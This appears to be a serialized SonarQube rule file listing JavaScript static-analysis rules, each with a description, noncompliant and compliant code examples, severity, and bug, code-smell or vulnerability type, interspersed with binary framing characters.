javascriptS905PNon-empty statements should change control flow or have at least one side-effect"MAJOR*js:‡<p>Any statement (other than a null statement, which means a statement containing only a semicolon <code>;</code>) which has no side effect and does
not result in a change of control flow will normally indicate a programming error, and therefore should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a == 1; // Noncompliant; was assignment intended?
var msg = "Hello, "
  "World!"; // Noncompliant; have we forgotten '+' operator on previous line?
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/482">MITRE, CWE-482</a> - Comparing instead of Assigning </li>
</ul>ZBUG
Á
javascript:S104”

javascriptS104,Files should not have too many lines of code"MAJOR*js:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
Ò
javascript:S3271‹

javascriptS3271 Local storage should not be used"MAJOR*js:ä<p>Session storage and local storage are HTML 5 features which allow developers to easily store megabytes of data client-side, as opposed to the 4Kb
cookies can accommodate. While useful to speed applications up on the client side, it can be dangerous to store sensitive information this way because
the data is not encrypted by default and any script on the page may access it.</p>
<p>This rule raises an issue when the <code>localStorage</code> and <code>sessionStorage</code> API's are used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
localStorage.setItem("login", login); // Noncompliant
sessionStorage.setItem("sessionId", sessionId); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://dl.packetstormsecurity.net/papers/attack/HTML5AttackVectors_RafayBaloch_UPDATED.pdf">Packet Storm Security</a> - HTML 5 Modern
  Day Attack And Defence Vectors </li>
</ul>ZVULNERABILITY
õ
javascript:S106á

javascriptS106<Standard outputs should not be used directly to log anything"MAJOR*js:ù<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log(password_entered); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RoElAQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>Z
CODE_SMELL
ó
javascript:S107É

javascriptS107-Functions should not have too many parameters"MAJOR*js:®<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething(param1, param2, param3, param4, param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(param1, param2, param3, param4) {
...
}
</pre>Z
CODE_SMELL
õ
javascript:S108á

javascriptS108.Nested blocks of code should not be left empty"MAJOR*js:´<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; length; i++) {}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty. Moreover <code>catch</code> blocks are ignored.</p>Z
CODE_SMELL
‡
javascript:S109Ã

javascriptS109 Magic numbers should not be used"MAJOR*js:˛<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loop, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  for (let i = 0; i &lt; 4; i++) {    // Noncompliant, 4 is a magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething() {
  const numberOfCycles = 4;
  for (let i = 0; i &lt; numberOfCycles; i++) {
    // ...
  }
}
</pre>Z
CODE_SMELL
»
javascript:S2873≥

javascriptS2873/Calls should not be made to non-callable values"MAJOR*js:‹<p>The fact that JavaScript is not a strongly typed language allows developers a lot of freedom, but that freedom can be dangerous if you go too far
with it. </p>
<p>Specifically, it is syntactically acceptable to invoke any expression as though its value were a function. But a <code>TypeError</code> may be
raised if you do.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo = 1;
foo();   // Noncompliant; TypeError

foo = undefined;
foo();  // Noncompliant; TypeError
</pre>ZBUG
æ	
javascript:S2870©	

javascriptS2870%"delete" should not be used on arrays"MAJOR*js:’<p>The <code>delete</code> operator can be used to remove a property from any object. Arrays are objects, so the <code>delete</code> operator can be
used here too, but if it is, a hole will be left in the array because the indexes/keys won't be shifted to reflect the deletion. </p>
<p>The proper method for removing an element at a certain index would be:</p>
<ul>
  <li> <code>Array.prototype.splice</code> - add/remove elements from the array </li>
  <li> <code>Array.prototype.pop</code> - add/remove elements from the end of the array </li>
  <li> <code>Array.prototype.shift</code> - add/remove elements from the beginning of the array </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var myArray = ['a', 'b', 'c', 'd'];

delete myArray[2];  // Noncompliant. myArray =&gt; ['a', 'b', undefined, 'd']
console.log(myArray[2]); // expected value was 'd' but output is undefined
</pre>
<h2>Compliant Solution</h2>
<pre>
var myArray = ['a', 'b', 'c', 'd'];

// removes 1 element from index 2
removed = myArray.splice(2, 1);  // myArray =&gt; ['a', 'b', 'd']
console.log(myArray[2]); // outputs 'd'
</pre>Z
CODE_SMELL
¿
javascript:S122¨

javascriptS122&Statements should be on separate lines"MAJOR*js:ÿ<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>Z
CODE_SMELL
ö
javascript:S2757Ö

javascriptS2757=Non-existent operators '=+', '=-' and '=!' should not be used"MAJOR*js:†<p>The use of operators pairs (<code>=+</code>, <code>=-</code> or <code>=!</code>) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code> and <code>=!</code> are used without any space between the two operators and when
there is at least one whitespace after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let target =-5;
let num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
let target = -5;
let num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>ZBUG
Ç
javascript:S1788Ì

javascriptS17886Function parameters with default values should be last"MAJOR*js:à<p>The ability to define default values for function parameters can make a function easier to use. Default parameter values allow callers to specify
as many or as few arguments as they want while getting the same functionality and minimizing boilerplate, wrapper code.</p>
<p>But all function parameters with default values should be declared after the function parameters without default values. Otherwise, it makes it
impossible for callers to take advantage of defaults; they must re-specify the defaulted values or pass <code>undefined</code> in order to "get to"
the non-default parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function multiply(a = 1, b) {  // Noncompliant
  return a*b;
}

var x = multiply(42);  // returns NaN as b is undefined
</pre>
<h2>Compliant Solution</h2>
<pre>
function multiply(b, a = 1) {
  return a*b;
}

var x = multiply(42);  // returns 42 as expected
</pre>Z
CODE_SMELL
î
javascript:S2999ˇ

javascriptS2999-"new" operators should be used with functions"MAJOR*js:™<p>The <code>new</code> keyword should only be used with objects that define a constructor function. Use it with anything else, and you'll get a
<code>TypeError</code> because there won't be a constructor function for the <code>new</code> keyword to invoke.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function MyClass() {
  this.foo = 'bar';
}

var someClass = 1;

var obj1 = new someClass;    // Noncompliant;
var obj2 = new MyClass();    // Noncompliant if considerJSDoc parameter set to true. Compliant when considerJSDoc=false
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
 * @constructor
 */
function MyClass() {
  this.foo = 'bar';
}

var someClass = function(){
  this.prop = 1;
}

var obj1 = new someClass;  // Compliant
var obj2 = new MyClass();  // Compliant regardless of considerJSDoc value
</pre>ZBUG
“	
javascript:S1751Ω	

javascriptS17515Loops with at most one iteration should be refactored"MAJOR*js:‡<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (let i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  console.log("i is " + i);
  break;
}
...
for (let i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if (i == x) {
    break;
  } else {
    console.log("i is " + i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (let i = 0; i &lt; 10; i++) {
  console.log("i is " + i);
}
...
for (let i = 0; i &lt; 10; i++) {
  if (i == x) {
    break;
  } else {
    console.log("i is " + i);
  }
}
</pre>ZBUG
≈
javascript:S1871∞

javascriptS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*js:™<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=javascript%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>Z
CODE_SMELL
∂
javascript:S1764°

javascriptS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*js:Æ<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b &amp;&amp; a == b) { // if the first one is true, the second one is too
  doX();
}
if (a &gt; a) { // always false
  doW();
}

var j = 5 / 5; //always 1
var k = 5 - 5; //always 0
</pre>
<h2>Exceptions</h2>
<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </p>
<p>Moreover comma operator <code>,</code> and <code>instanceof</code> operator are ignored as there are use-cases when there usage is valid.</p>
<pre>
if (f !== f) { // test for NaN value
  console.log("f is NaN");
}

var i = 1 &lt;&lt; 1; // Compliant
var j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=javascript%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
≈
!javascript:UnusedFunctionArgumentü

javascriptUnusedFunctionArgument,Unused function parameters should be removed"MAJOR*js:≥<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething(a, b) { // "a" is unused
  return compute(b);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(b) {
  return compute(b);
}
</pre>
<h2>Exceptions</h2>
<p>When writing function callbacks, some arguments might be required as part of the function signature, but not actually needed by the callback code.
For instance, JQuery has the 'each' helper to iterate over arrays or objects, but using the counter 'i' should remain optional:</p>
<pre>
$(["first", "last"]).each(function (i, value) {
  computeSomethingWithValue(value);
});
</pre>
<p>So only unused arguments listed at the end of the argument list will be flagged with issues because they could be omitted from the function
signature. Unused arguments which are followed by an argument that <em>is</em> used will be ignored.</p>
<p>Examples :</p>
<pre>
var myFirsCallBackFunction = function (p1, p2, p3, p4) {  // p2 is ignored, but p4 is reported
                                              return p1 + p3; }

var mySecondCallBackFunction = function (p1, p2, p3, p4) {  // p1, p2 and p3 are ignored
                                              return p4; }

var myThirdCallBackFunction = function (p1, p2, p3, p4) {  // p1 is ignored but p3 and p4 are reported
                                              return p2; }
</pre>
<p>Further, when <code>arguments</code> is used in the function body, no parameter is reported as unused. </p>
<pre>
function doSomething(a, b, c) {
  compute(arguments);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
≈
javascript:S1697∞

javascriptS1697WShort-circuit logic should be used to prevent null pointer dereferences in conditionals"MAJOR*js:±
<p>When either the equality operator in a test for <code>null</code> or <code>undefined</code>, or the logical operator that follows it is reversed,
the code has the appearance of safely null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is
null-tested and then dereferenced only if it is <code>null</code>/<code>undefined</code>, leading to a guaranteed <code>TypeError</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (str == null &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str == undefined &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str != null || str.length &gt; 0) {
  console.log("String is not empty");
}

if (str != undefined || str.length &gt; 0) {
  console.log("String is not empty");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (str != null &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str != undefined &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str == null || str.length &gt; 0) {
  console.log("String is not empty");
}

if (str == undefined || str.length &gt; 0) {
  console.log("String is not empty");
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2259'>S2259</a> instead.</p>ZBUG
ö	
javascript:S2424Ö	

javascriptS2424)Built-in objects should not be overridden"MAJOR*js:¥<p>Overriding an object changes its behavior and could potentially impact all code using that object. Overriding standard, built-in objects could
therefore have broad, potentially catastrophic effects on previously-working code.</p>
<p>This rule detects overrides of the following native objects:</p>
<ul>
  <li> Fundamental objects - Object, Function, Boolean, Symbol, Error, EvalError, InternalError, RangeError, ReferenceError, SyntaxError, TypeError,
  URIError </li>
  <li> Numbers and dates - Number, Math, Date </li>
  <li> Text processing - String, RegExp </li>
  <li> Indexed collections - Array, Int8Array, Uint8Array, Uint8ClampedArray, Int16Array, Unit16Array, Int32Array, Uint32Array, Float32Array,
  Float64Array </li>
  <li> Keyed collections - Map, Set, WeakMap, WeakSet </li>
  <li> Structured data - ArrayBuffer, DataView, JSON </li>
  <li> Control abstraction objects - Promise </li>
  <li> Reflection - Reflect, Proxy </li>
  <li> Internationalization - Intl </li>
  <li> Non-standard objects - Generator, Iterator, ParallelArray, StopIteration </li>
</ul>ZBUG
ˇ

javascript:S3513Í


javascriptS3513+"arguments" should not be accessed directly"MAJOR*js:ê
<p>The magic of JavaScript is that you can pass arguments to functions that don't declare parameters, and on the other side, you can use those
passed-in arguments inside the no-args <code>function</code>. </p>
<p>But just because you can, that does't mean you should. The expectation and use of arguments inside functions that don't explicitly declare them is
confusing to callers. No one should ever have to read and fully understand a function to be able to use it competently. </p>
<p>If you don't want to name arguments explicitly, use the <code>...</code> syntax to specify that an a variable number of arguments is expected. Then
inside the function, you'll be dealing with a first-class array, rather than an array-like structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function concatenate() {
  let args = Array.prototype.slice.call(arguments);  // Noncompliant
  return args.join(', ');
}

function doSomething(isTrue) {
  var args = Array.prototype.slice.call(arguments, 1); // Noncompliant
  if (!isTrue) {
    for (var arg of args) {
      ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function concatenate(...args) {
  return args.join(', ');
}

function doSomething(isTrue, ...values) {
  if (!isTrue) {
    for (var value of values) {
      ...
    }
  }
}
</pre>Z
CODE_SMELL
Ì	
javascript:S3758ÿ	

javascriptS3758KValues not convertible to numbers should not be used in numeric comparisons"MAJOR*js:ﬁ<p>In a Zen-like manner, <code>NaN</code> isn't equal to anything, even itself. So comparisons (<code>&gt;, &lt;, &gt;=, &lt;=</code>) where one
operand is <code>NaN</code> or evaluates to <code>NaN</code> always return <code>false</code>. Specifically, <code>undefined</code> and objects that
cannot be converted to numbers evaluate to <code>NaN</code> when used in numerical comparisons.</p>
<p>This rule raises an issue when there is at least one path through the code where one of the operands to a comparison is <code>NaN</code>,
<code>undefined</code> or an <code>Object</code> which cannot be converted to a number.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x;  // x is currently "undefined"
if (someCondition()) {
  x = 42;
}

if (42 &gt; x) {  // Noncompliant; "x" might still be "undefined"
  doSomething();
}

var obj = {prop: 42};
if (obj &gt; 24) { // Noncompliant
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var x;
if (someCondition()) {
  x = 42;
} else {
  x = foo();
}

if (42 &gt; x) {
  doSomething();
}

var obj = {prop: 42};
if (obj.prop &gt; 24) {
  doSomething();
}
</pre>Z
CODE_SMELL
π
javascript:S3757§

javascriptS37570Arithmetic operations should not result in "NaN""MAJOR*js:≈<p>The result of an expression with an arithmetic operator <code>/, *, %, ++, --, -, +=, -=, *=, /=, %=, +</code> or unary operator <code>+, -</code>
when at least one operand is <code>Object</code> or <code>Undefined</code> will be always a <code>NaN</code> (Not a Number).</p>
<h2>Noncompliant Code Example</h2>
<pre>
x = [1, 2];
var y = x / 4;  //Noncompliant
</pre>
<h2>Exceptions</h2>
<ul>
  <li> <code>Date</code> operands: they are implicitly converted to numbers. </li>
  <li> The binary <code>+</code> operator with <code>Object</code> operand (concatenation). </li>
</ul>Z
CODE_SMELL
¥
javascript:S3759ü

javascriptS3759*Non-existent properties should not be read"MAJOR*js:Õ<p>Reading a non-existent property on an object always returns <code>undefined</code>. Doing so is usually an error; either in the name of the
property or the type of the variable being accessed.</p>
<p>If an attempt is made to access properties of a primitive, the primitive is automatically encased in a primitive-wrapper object for the operation.
But being "promoted" to an object doesn't mean that the primitive will actually have properties to access. The wrapper object still won't have the
non-existent property and <code>undefined</code> will be returned instead. </p>
<p>This rule raises an issue when an attempt is made to access properties of a primitive. Thus this rule should only be activated when you don't use
monkey patching for standard objects, like <code>Number</code>, <code>Boolean</code> and <code>String</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
x = 42;
y = x.length;   // Noncompliant, Number type doesn't have "length" property
</pre>
<h2>Exceptions</h2>
<p>The Ember framework introduces a few extensions to <code>String</code>. Since it is a widely used package, the following <code>String</code>
properties will not trigger this rule even though they are not built-in:</p>
<ul>
  <li> <code>camelize</code> </li>
  <li> <code>capitalize</code> </li>
  <li> <code>classify</code> </li>
  <li> <code>dasherize</code> </li>
  <li> <code>decamelize</code> </li>
  <li> <code>fmt</code> </li>
  <li> <code>loc</code> </li>
  <li> <code>underscore</code> </li>
  <li> <code>w</code> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
®
javascript:S4043ì

javascriptS40436Array-mutating methods should not be used misleadingly"MAJOR*js:µ<p>Many of JavaScript's <code>Array</code> methods return an altered version of the array while leaving the source array intact. <code>reverse</code>
and <code>sort</code> do not fall into this category. Instead, they alter the source array <em>in addition to</em> returning the altered version,
which is likely not what was intended.</p>
<p>This rule raises an issue when the return values of these methods are assigned, which could lead maintainers to overlook the fact that the original
value is altered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var b = a.reverse(); // Noncompliant
var d = c.sort(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var b = [...a].reverse();  // de-structure and create a new array, so reverse doesn't impact 'a'
a.reverse();

c.sort(); // this sorts array in place
</pre>ZBUG
î
javascript:S4165ˇ

javascriptS4165#Assignments should not be redundant"MAJOR*js:≠<p>The transitive property says that if <code>a == b</code> and <code>b == c</code>, then <code>a == c</code>. In such cases, there's no point in
assigning <code>a</code> to <code>c</code> or vice versa because they're already equivalent. </p>
<p>This rule raises an issue when an assignment is useless because the assigned-to variable already holds the value on all execution paths.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = b;
c = a;
b = c; // Noncompliant: c and b are already the same
</pre>
<h2>Compliant Solution</h2>
<pre>
a = b;
c = a;
</pre>Z
CODE_SMELL
÷
javascript:S3403¡

javascriptS3403BStrict equality operators should not be used with dissimilar types"MAJOR*js:◊<p>Comparing dissimilar types using the strict equality operators <code>===</code> and <code>!==</code> will always return the same value,
respectively <code>false</code> and <code>true</code>, because no type conversion is done before the comparison. Thus, such comparisons can only be
bugs.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = 8;
var b = "8";

if (a === b) {  // Noncompliant; always false
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var a = 8;
var b = "8";

if (a == b) {
  // ...
}
</pre>
<p>or</p>
<pre>
var a = 8;
var b = "8";

if (a === Number(b)) {
  // ...
}
</pre>ZBUG
∆
javascript:S2432±

javascriptS2432 Setters should not return values"MAJOR*js:È<p>Functions declared with the <code>set</code> keyword will automatically return the values they were passed. Thus any value explicitly returned from
a setter will be ignored, and explicitly returning a value is an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var person = {
  // ...
  set name(name) {
    this.name = name;
    return 42;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var person = {
  // ...
  set name(name) {
    this.name = name;
  }
}
</pre>ZBUG
¢	
javascript:S2550ç	

javascriptS2550?"defaults" should be a function when objects or arrays are used"MAJOR*js:¶<p>When using the Backbone.js framework with model <code>defaults</code> that contain arrays or objects, <code>defaults</code> should be defined as a
function rather than an object. This is because objects and arrays are passed by reference in JavaScript. So a <code>defaults</code> object that
contains arrays or objects is going to set the default value of every instance to point to the same shared object or array.</p>
<p>Use a function instead and a fresh copy of the object or array will be peeled off for each instance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var Person = Backbone.Model.extend({
    defaults: {  // Noncompliant; every instance of Person will share the same instance of favoriteColors
        favoriteColors: ["blue","purple","raspberry"]
    }
});
</pre>
<h2>Compliant Solution</h2>
<pre>
var Person = Backbone.Model.extend({
    defaults: function() {
      return {
        favoriteColors: ["blue","purple","raspberry"]
      };
    }
});
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
˛
javascript:S3760È

javascriptS37609Arithmetic operators should only have numbers as operands"MAJOR*js:Å<p>Expressions with arithmetic (<code>/, *, %, ++, --, -, -=, *=, /=, %=, +=, +</code>), unary (<code>-</code>), or comparison operators (<code>&gt;,
&lt;, &gt;=, &lt;=</code>) where one, or both, of the operands is a String, Boolean or Date value rely on implicit conversions. Both the
maintainability and reliability levels of such a piece of code are questionable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str = "80";
quarter = str / 4; // Noncompliant

if (str &lt; 10) { // Noncompliant
   // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
str = "80";
parsedStr = parseInt(str);
quarter = parsedStr / 4;

if (parsedStr &lt; 10) {
  // ...
}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Expressions using the binary <code>+</code> operator with at least one <code>String</code> operand are ignored because the <code>+</code>
  operator will perform a concatenation in that case. </li>
  <li> Comparisons where both operands are strings are ignored because a lexicographical comparison is performed in that case. </li>
</ul>Z
CODE_SMELL
Á
javascript:S2762“

javascriptS2762Selections should be stored"MAJOR*js:à<p>jQuery doesn't cache elements for you. If you've made a selection that you might need to make again, you should save the selection in a variable
rather than making the selection repeatedly.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 2</p>
<pre>
$( "p" ).hide();
$( "p" ).show();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var paragraph = $( "p" );

paragraph.hide();
paragraph.show();
</pre>
<h2>Exceptions</h2>
<p>Stored selections are not updated when the DOM changes. Since variables may need to updated this rule ignores selections that are repeated during
an assignment.</p>
<pre>
var paragraph = $("p");

// ...

paragraph = $("p");
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
É
javascript:S4144Ó

javascriptS41443Functions should not have identical implementations"MAJOR*js:å<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, the code should be refactored.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {  // Noncompliant
  doTheThing();
  doOtherThing();
  return code;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {
  return calculateCode();
}
</pre>
<h2>Exceptions</h2>
<p>Functions with fewer than 3 lines are ignored.</p>Z
CODE_SMELL
Ú
javascript:S1439›

javascriptS1439DOnly "while", "do", "for" and "switch" statements should be labelled"MAJOR*js:Í<p>Any statement or block of statements can be identified by a label, but those labels should be used only on <code>while</code>,
<code>do-while</code>, <code>for</code> and <code>switch</code> statements. Using labels in any other context leads to unstructured, confusing code.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel: if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    console.log("12");
    break myLabel;
  }
  console.log("Odd number, but not 12");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myLabel: for (i = 0; i &lt; 10; i++) {   // Compliant
  console.log("Loop");
  break myLabel;
}
</pre>Z
CODE_SMELL
·
javascript:S2769Ã

javascriptS27690Selection results should be tested with "length""MAJOR*js:Ù<p>Once you've made a selection, you typically want to know whether it actually found anything. Since selectors <em>always</em> return an object (the
set of selected DOM elements), the best way to see whether your selection found anything is to test the returned object's <code>.length</code>
property. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( $( "div.foo" ) ) {  // Noncompliant
  // this code always runs, even when the selector didn't match any elements
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Testing whether a selection contains elements.
if ( $( "div.foo" ).length &gt; 0) {
  // this code only runs if elements were found
  //  ...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
‘	
javascript:S3616ø	

javascriptS3616AComma and logical OR operators should not be used in switch cases"MAJOR*js:÷<p>The comma operator (<code>,</code>) evaluates its operands, from left to right, and returns the second one. That's useful in some situations, but
just wrong in a <code>switch</code> <code>case</code>. You may think you're compactly handling multiple values in the case, but only the last one in
the comma-list will ever be handled. The rest will fall through to the default.</p>
<p>Similarly the logical OR operator (<code>||</code>) will not work in a <code>switch</code> <code>case</code>, only the first argument will be
considered at execution time.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch a {
  case 1,2:  // Noncompliant; only 2 is ever handled by this case
    doTheThing(a);
  case 3 || 4: // Noncompliant; only '3' is handled
    doThatThing(a);
  case 5:
    doTheOtherThing(a);
  default:
    console.log("Neener, neener!");  // this happens when a==1 or a == 4
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch a {
  case 1:
  case 2:
    doTheThing(a);
  case 3:
  case 4:
    doThatThing(a);
  case 5:
    doTheOtherThing(a);
  default:
    console.log("Neener, neener!");
}
</pre>ZBUG
∂
javascript:S4140°

javascriptS4140$Sparse arrays should not be declared"MAJOR*js:Œ<p>An array declared with missing ("sparse") elements is likely to be an error: an extra comma was inserted or perhaps the developer meant to insert
the missing value and forgot.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let a = [1, , 3, 6, 9];  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let a = [1, 3, 6, 9];
</pre>Z
CODE_SMELL
˜
javascript:ConditionalOperator‘

javascriptConditionalOperator'The ternary operator should not be used"MAJOR*js:<p>While the ternary operator is pleasingly compact, its use can make code more difficult to read. It should therefore be avoided in favor of the more
verbose <code>if</code>/<code>else</code> structure.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {
  var b = (a === 'A') ? 'is A' : 'is not A'; // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  var b;
  if (a === 'A') {
    b = 'is A';
  }
  else {
    b = 'is not A';
  }
  // ...
}
</pre>Z
CODE_SMELL
ü
javascript:S4143ä

